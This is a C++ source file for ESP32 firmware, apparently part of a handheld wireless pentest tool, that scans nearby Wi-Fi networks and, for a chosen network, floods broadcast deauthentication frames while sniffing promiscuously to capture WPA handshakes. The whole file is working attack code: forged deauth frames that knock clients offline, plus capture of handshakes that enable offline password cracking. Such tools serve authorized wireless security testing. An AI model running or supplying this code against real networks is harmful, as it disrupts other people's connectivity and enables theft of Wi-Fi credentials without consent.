#include "handshake_sniffer.h"
#include "sniffer.h"
#include "wifi_atks.h"
#include <WiFi.h>
#include "globals.h"
#include "esp_wifi.h"
#include "modules/wifi/wifi_atks.h"

extern std::vector<Option> options;

bool handysniff_start() {
    displayTextLine("Scanning...");
    WiFi.mode(WIFI_MODE_STA);
    int nets = WiFi.scanNetworks(false, true);
    if (nets <= 0) {
        displayTextLine("No networks");
        delay(2000);
        return false;
    }

    options.clear();
    for (int i = 0; i < nets && options.size() < 250; ++i) {
        String ssid    = WiFi.SSID(i);
        uint8_t bssid[6];
        memcpy(bssid, WiFi.BSSID(i), 6);
        uint8_t channel = WiFi.channel(i);

        char buf[64];
        snprintf(buf, sizeof(buf), "%s  Ch%d", ssid.c_str(), channel);

        options.push_back({
            strdup(buf),
            [=]() {
                // Build target record
                wifi_ap_record_t rec{};
                memcpy(rec.bssid, bssid, 6);
                rec.primary = channel;

                // Prepare deauth frame
                memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
                for (int i = 0; i < 6; i++) {
                    deauth_frame[4 + i]  = 0xFF;      // target: broadcast
                    deauth_frame[10 + i] = bssid[i];  // transmitter
                    deauth_frame[16 + i] = bssid[i];  // bssid
                }

                // 1) Setup WiFi channel and sniffer
                WiFi.disconnect(true, true);
                esp_wifi_set_promiscuous(false);
                esp_wifi_set_promiscuous_rx_cb(nullptr);
                esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
                _only_HS = true;
                esp_wifi_set_promiscuous(true);
                esp_wifi_set_promiscuous_rx_cb(sniffer);

                // 2) Deauth + sniff loop
                uint32_t cycleStart = millis();
                uint32_t lastStatUpdate = millis();
                uint32_t frameCount = 0;

                drawMainBorderWithTitle("Deauth + Sniff");

                while (!check(EscPress)) {
                    uint32_t elapsed = (millis() - cycleStart) % 5000;

                    if (elapsed < 2000) {
                        // First 2s: Deauth flood
                        wsl_bypasser_send_raw_frame(&rec, channel);
                        for (int k = 0; k < 50; ++k) {
                            send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
                            frameCount += 3;
                        }
                        delay(10);
                    } else {
                        // Passive sniff
                        delay(100);
                    }

                    // Every 2s update UI
                    if (millis() - lastStatUpdate > 2000) {
                        drawMainBorderWithTitle("Deauth + Sniff");
                        tft.setCursor(10, tftHeight - 25);
                        tft.printf("Frames: %u/s   ", frameCount / 2);
                        tft.setCursor(10, tftHeight - 45);
                        tft.printf("Channel %d     ", channel);
                        frameCount = 0;
                        lastStatUpdate = millis();
                    }
                }

                // 3) Cleanup
                esp_wifi_set_promiscuous(false);
                esp_wifi_set_promiscuous_rx_cb(nullptr);
                WiFi.mode(WIFI_OFF);
                returnToMenu = true;
            }
        });

    }

    // “Back” entry
    options.push_back({ "Back", [](){ /* no-op */ } });

    loopOptions(options);
    return false;
}
